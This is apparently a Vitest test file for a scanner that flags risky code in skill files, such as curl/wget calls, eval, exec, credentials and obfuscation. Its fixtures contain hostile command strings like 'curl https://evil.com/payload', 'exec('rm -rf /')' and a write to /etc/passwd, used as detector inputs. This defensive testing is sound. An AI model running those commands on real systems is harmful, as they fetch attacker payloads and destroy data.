import { describe, test, expect } from "vitest";
import {
  scanCode,
  analyzePermissions,
  stripControlBytes,
} from "./security-auditor-scan";
describe("scanCode", () => {
  test("detects curl usage", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Run: curl https://evil.com/payload",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    expect(networkCat!.matches.some((m) => m.match.includes("curl"))).toBe(
      true,
    );
    expect(networkCat!.matches[0].severity).toBe("critical");
  });

  test("detects wget usage", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Run: wget https://evil.com/payload",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    expect(networkCat!.matches.some((m) => m.match.includes("wget"))).toBe(
      true,
    );
  });

  test("detects exec usage", () => {
    const files = [
      {
        relPath: "script.js",
        content: "const result = exec('ls -la');",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const shellCat = results.find((r) => r.category === "Shell execution");
    expect(shellCat).toBeDefined();
    expect(shellCat!.matches[0].severity).toBe("critical");
  });

  test("detects child_process", () => {
    const files = [
      {
        relPath: "index.js",
        content: 'const { exec } = require("child_process");',
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const shellCat = results.find((r) => r.category === "Shell execution");
    expect(shellCat).toBeDefined();
  });

  test("detects eval usage", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Use eval() to process dynamic input",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const codeCat = results.find(
      (r) => r.category === "Dynamic code execution",
    );
    expect(codeCat).toBeDefined();
    expect(codeCat!.matches[0].severity).toBe("critical");
  });

  test("detects external URLs (not github/localhost)", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Visit https://suspicious-site.com/api",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const urlCat = results.find((r) => r.category === "External URLs");
    expect(urlCat).toBeDefined();
  });

  test("does NOT flag github.com URLs as external", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Visit https://github.com/user/repo",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const urlCat = results.find((r) => r.category === "External URLs");
    expect(urlCat).toBeUndefined();
  });

  test("does NOT flag localhost URLs as external", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Visit https://localhost:3000/api",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const urlCat = results.find((r) => r.category === "External URLs");
    expect(urlCat).toBeUndefined();
  });

  test("detects embedded credentials", () => {
    const files = [
      {
        relPath: "config.ts",
        content: "API_KEY = 'sk-1234567890'",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const credCat = results.find((r) => r.category === "Embedded credentials");
    expect(credCat).toBeDefined();
    expect(credCat!.matches[0].severity).toBe("critical");
  });

  test("detects process.env access", () => {
    const files = [
      {
        relPath: "index.ts",
        content: "const key = process.env.OPENAI_KEY;",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const envCat = results.find(
      (r) => r.category === "Environment variable access",
    );
    expect(envCat).toBeDefined();
    expect(envCat!.matches[0].severity).toBe("info");
  });

  test("detects obfuscation patterns", () => {
    const files = [
      {
        relPath: "script.js",
        content: "const decoded = atob('c2VjcmV0');",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const obfCat = results.find((r) => r.category === "Obfuscation patterns");
    expect(obfCat).toBeDefined();
  });

  test("detects fetch() calls", () => {
    const files = [
      {
        relPath: "api.ts",
        content: "const res = await fetch('https://api.example.com');",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    expect(networkCat!.matches.some((m) => m.severity === "warning")).toBe(
      true,
    );
  });

  test("returns empty array for clean content", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: `---
name: clean-skill
version: 1.0.0
---

# Clean Skill

This skill does simple text transformation.
No network calls, no shell commands, no eval.
`,
        lineCount: 10,
      },
    ];
    const results = scanCode(files);
    expect(results.length).toBe(0);
  });

  test("reports correct file and line number", () => {
    const files = [
      {
        relPath: "multi.md",
        content: "line 1\nline 2\ncurl http://evil.com\nline 4",
        lineCount: 4,
      },
    ];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    const curlMatch = networkCat!.matches.find((m) => m.match.includes("curl"));
    expect(curlMatch!.line).toBe(3);
    expect(curlMatch!.file).toBe("multi.md");
  });

  test("truncates long lines", () => {
    const longLine = "curl " + "a".repeat(200);
    const files = [{ relPath: "long.md", content: longLine, lineCount: 1 }];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    const match = networkCat!.matches[0];
    expect(match.match.length).toBeLessThanOrEqual(123); // 120 + "..."
  });

  test("scans multiple files", () => {
    const files = [
      { relPath: "a.md", content: "curl https://evil.com", lineCount: 1 },
      { relPath: "b.js", content: "eval('code')", lineCount: 1 },
    ];
    const results = scanCode(files);
    expect(results.length).toBeGreaterThanOrEqual(2);
    expect(results.some((r) => r.category === "Network requests")).toBe(true);
    expect(results.some((r) => r.category === "Dynamic code execution")).toBe(
      true,
    );
  });
});

// ─── analyzePermissions tests ───────────────────────────────────────────────

describe("analyzePermissions", () => {
  test("extracts shell permission from shell execution findings", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "exec('rm -rf /')", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "shell")).toBe(true);
  });

  test("extracts network permission from curl/wget", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "curl https://evil.com", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "network")).toBe(true);
  });

  test("extracts filesystem permission from writeFile", () => {
    const scans = scanCode([
      {
        relPath: "script.js",
        content: "writeFile('/etc/passwd', 'hacked')",
        lineCount: 1,
      },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "filesystem")).toBe(true);
  });

  test("extracts code-execution permission from eval", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "eval(userInput)", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "code-execution")).toBe(true);
  });

  test("extracts environment permission from process.env", () => {
    const scans = scanCode([
      {
        relPath: "config.ts",
        content: "const key = process.env.KEY;",
        lineCount: 1,
      },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "environment")).toBe(true);
  });

  test("returns empty for clean code", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "This is clean code.", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.length).toBe(0);
  });

  test("includes reason for each permission", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "exec('ls')", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    const shellPerm = perms.find((p) => p.type === "shell");
    expect(shellPerm).toBeDefined();
    expect(shellPerm!.reason).toBeTruthy();
    expect(shellPerm!.reason.length).toBeGreaterThan(0);
  });

  test("sorts permissions by risk (shell first)", () => {
    const scans = scanCode([
      {
        relPath: "SKILL.md",
        content: "process.env.KEY\ncurl http://a.com\nexec('ls')",
        lineCount: 3,
      },
    ]);
    const perms = analyzePermissions(scans);
    if (perms.length >= 2) {
      const shellIdx = perms.findIndex((p) => p.type === "shell");
      const envIdx = perms.findIndex((p) => p.type === "environment");
      if (shellIdx !== -1 && envIdx !== -1) {
        expect(shellIdx).toBeLessThan(envIdx);
      }
    }
  });
});

// ─── calculateVerdict tests ─────────────────────────────────────────────────

// ─── Real-call matchers (#809) ──────────────────────────────────────────────

describe("dynamic execution: real calls only (#809)", () => {
  const critical = (relPath: string, content: string) =>
    scanCode([{ relPath, content, lineCount: 1 }])
      .filter(
        (c) =>
          c.category === "Dynamic code execution" ||
          c.category === "Shell execution",
      )
      .flatMap((c) => c.matches)
      .filter((m) => m.severity === "critical");

  // Must stay critical: each reaches the language's builtin.
  const mustFail: Array<[string, string]> = [
    ["run.py", "result = eval(user_input)"],
    ["run.py", "exec(code)"],
    ["run.py", "    value = eval (expr)"],
    ["run.py", "builtins.eval(src)"],
    ["run.py", "__builtins__.exec(src)"],
    ["run.py", "__import__('builtins').exec(code)"],
    ["run.py", '__import__("builtins").eval(src)'],
    ["run.js", "const parts = [...eval(code)];"],
    ["run.js", "run(...exec(cmd))"],
    ["run.js", "const out = eval(x);"],
    ["run.js", "const f = new Function(x);"],
    ["run.js", "const f = Function('return 1');"],
    ["run.js", "window.eval(x)"],
    ["run.js", "globalThis.eval(x)"],
    ["run.js", "self.eval(x)"],
    ["run.js", "window.Function(x)()"],
    ["run.js", "if (eval(x)) {"],
    // A ternary branch is a call, not a method body (review of #809).
    ["run.js", "const cfg = c ? eval(src) : {};"],
    ["run.js", "x = c ? exec(cmd) : {}"],
    ["run.js", "f = c ? Function(code) : {}"],
    ["run.js", "p = c ? spawn(cmd) : {}"],
    ["run.js", "  ? eval(src) : {}"],
    ["run.js", "r = c ? eval(src) : null || {}"],
    ["run.js", "exec('rm -rf /tmp/x')"],
    ["run.js", "cp.exec(cmd)"],
    ["run.js", "child_process.exec(cmd)"],
    ["run.js", "spawn('sh', ['-c', cmd])"],
    ["run.js", "cp.spawn('sh')"],
    ["run.py", "child = pexpect.spawn(cmd)"],
    // A ternary wrapped so the call opens the line: `: {` is its else
    // branch, never a return type (fix round 1 of #809).
    ["run.js", "  eval(p) : {};"],
    ["run.ts", "  eval(p) : { a: 1 };"],
    ["run.js", "  exec(c): {}"],
    ["run.ts", "  exec(c): {}"],
    ["run.js", "  Function(p) : {}"],
    ["run.ts", "  Function(p) : {}"],
    ["run.mts", "  Function(p) : {}"],
    ["run.js", "\teval(x)\t: {}"],
    ["run.js", "  spawn(cmd) : {}"],
    ["run.ts", "  spawn(cmd) : {}"],
    // A return type is TS-only, and without a modifier only a plain name.
    ["run.js", "  eval(p) : Foo {"],
    ["run.ts", "  eval(p) : a<b>{}"],
    ["run.ts", "  eval(p) : a.b<c>{}"],
    // The receiver on the line before may be the global object.
    ["run.js", "  .eval(p);"],
    ["run.js", ".eval(p);"],
    ["run.ts", "\t.eval(p)"],
    ["run.js", "  ?.eval(p)"],
    ["run.js", "  .Function(p)()"],
    ["run.py", "    .eval(src)"],
  ];

  // Must pass: method definitions and calls on other objects.
  const mustPass: Array<[string, string]> = [
    ["render.py", "    def eval(self, expression):"],
    ["render.py", "    async def eval(self, expression: str) -> str:"],
    ["render.py", 'if self.eval("window.__ready === true"):'],
    ["render.py", 'browser.eval("document.title")'],
    ["render.py", "Browser().eval(expr)"],
    ["render.py", "    def exec(self, sql):"],
    ["db.py", "cursor.execute(query)"],
    ["db.py", "self.exec(sql)"],
    ["match.js", "const m = re.exec(line);"],
    ["match.js", "while ((m = /a(b)/g.exec(s)) !== null) {}"],
    ["page.js", "await page.eval(selector)"],
    ["page.js", "obj?.eval(x)"],
    ["engine.js", "function eval(node) {"],
    ["engine.js", "  eval(node) {"],
    ["engine.ts", "  async eval(node: Node): Promise<Value> {"],
    ["engine.js", "  exec(command) {"],
    ["engine.ts", "  static eval(node): Value {"],
    ["engine.ts", "  private exec(sql: string): Promise<Row[]> {"],
    ["engine.js", "  Function(name) {"],
    ["engine.js", "this.eval(node)"],
    ["engine.py", "def Function(name):"],
    ["pool.py", "    def spawn(self, n):"],
    ["pool.js", "function spawn(worker) {"],
    // TS methods with a plain return type, and no-annotation methods.
    ["engine.ts", "  eval(node): Value {"],
    ["engine.ts", "  eval(node: Node): ast.Value {"],
    ["engine.ts", "  exec(sql): Row[] {"],
    ["engine.tsx", "  Function(name): Fn {"],
    ["engine.ts", "  spawn(n): Worker {"],
    ["engine.ts", "  eval(x) {"],
    ["engine.ts", "  public eval(x): Map<string, number> {"],
    ["engine.ts", "  async eval(x): Promise<A | B> {"],
    // A receiver on the same line, even with a space before `.`.
    ["page.js", "browser .eval(x)"],
    ["page.js", "browser\t?.eval(x)"],
  ];

  test.each(mustFail)("flags %s: %s", (relPath, line) => {
    expect(critical(relPath, line).length).toBeGreaterThan(0);
  });

  test.each(mustPass)("does not flag %s: %s", (relPath, line) => {
    expect(critical(relPath, line)).toEqual([]);
  });

  test("the issue repro reports no dynamic code execution", () => {
    const content = [
      "class Browser:",
      "    def eval(self, expression):",
      '        return self.send("Runtime.evaluate", {"expression": expression})',
      "",
      'Browser().eval("window.ready === true")',
    ].join("\n");
    const results = scanCode([
      { relPath: "scripts/render.py", content, lineCount: 5 },
    ]);
    expect(results.find((r) => r.category === "Dynamic code execution")).toBe(
      undefined,
    );
  });

  test("a real call on the same file as a method is still flagged", () => {
    const content = "def eval(self, e):\n    return eval(e)\n";
    const results = scanCode([{ relPath: "x.py", content, lineCount: 2 }]);
    const cat = results.find((r) => r.category === "Dynamic code execution");
    expect(cat!.matches.map((m) => m.line)).toEqual([2]);
    expect(analyzePermissions(results).map((p) => p.type)).toContain(
      "code-execution",
    );
  });
});

describe("control bytes in findings (#809)", () => {
  test("a finding never carries NUL, escape or other control bytes", () => {
    const content = "abc\0\0eval(\x01\x1b[31mX\x7f\x9b";
    const results = scanCode([{ relPath: "blob.js", content, lineCount: 1 }]);
    const match = results.flatMap((r) => r.matches)[0];
    expect(match).toBeDefined();
    // eslint-disable-next-line no-control-regex
    expect(match.match).not.toMatch(/[\x00-\x08\x0a-\x1f\x7f-\x9f]/);
    expect(match.match).toBe("abc??eval(??[31mX??");
  });

  test("tabs are kept", () => {
    expect(stripControlBytes("a\tb\0c")).toBe("a\tb?c");
  });
});
